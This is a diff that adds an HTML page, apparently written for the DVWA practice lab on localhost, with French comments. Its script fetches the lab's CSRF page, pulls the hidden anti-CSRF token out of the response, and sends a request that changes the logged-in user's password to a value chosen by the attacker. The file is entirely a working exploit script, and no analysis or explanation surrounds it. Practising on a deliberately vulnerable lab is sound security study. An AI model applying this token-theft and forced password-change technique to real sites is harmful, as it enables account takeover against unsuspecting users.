@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    // http://localhost/DVWA-master/hackable/uploads/csrf.html
+    <script>
+        // requête ajax => JAVASCRIPT 
+        const req = new XMLHttpRequest()
+        const url = "http://localhost/DVWA-master/vulnerabilities/csrf/";
+        const nxMotPass = "nouveau"
+
+        // appeler la page 
+        req.open("GET" , url);
+        req.onload = function(){
+            // récupérer le token dans le champ input hidden
+            const contenuPage = req.responseText;
+            const page = document.createElement("html")
+            page.innerHTML = contenuPage
+            const token_csrf =  page.querySelector("input[type='hidden']").value
+            // console.log(token_csrf)
+
+            // deuxieme requête ajax pour exécuter la requete CSRF
+            const req2 = new XMLHttpRequest();
+            const payload = url + "?password_new="+nxMotPass+"&password_conf="+nxMotPass+"&Change=Change&user_token=" + token_csrf; 
+            req2.open("GET" , payload)
+            req2.send(); 
+        }
+        req.send(); 
+    </script>
+</body>
+</html>
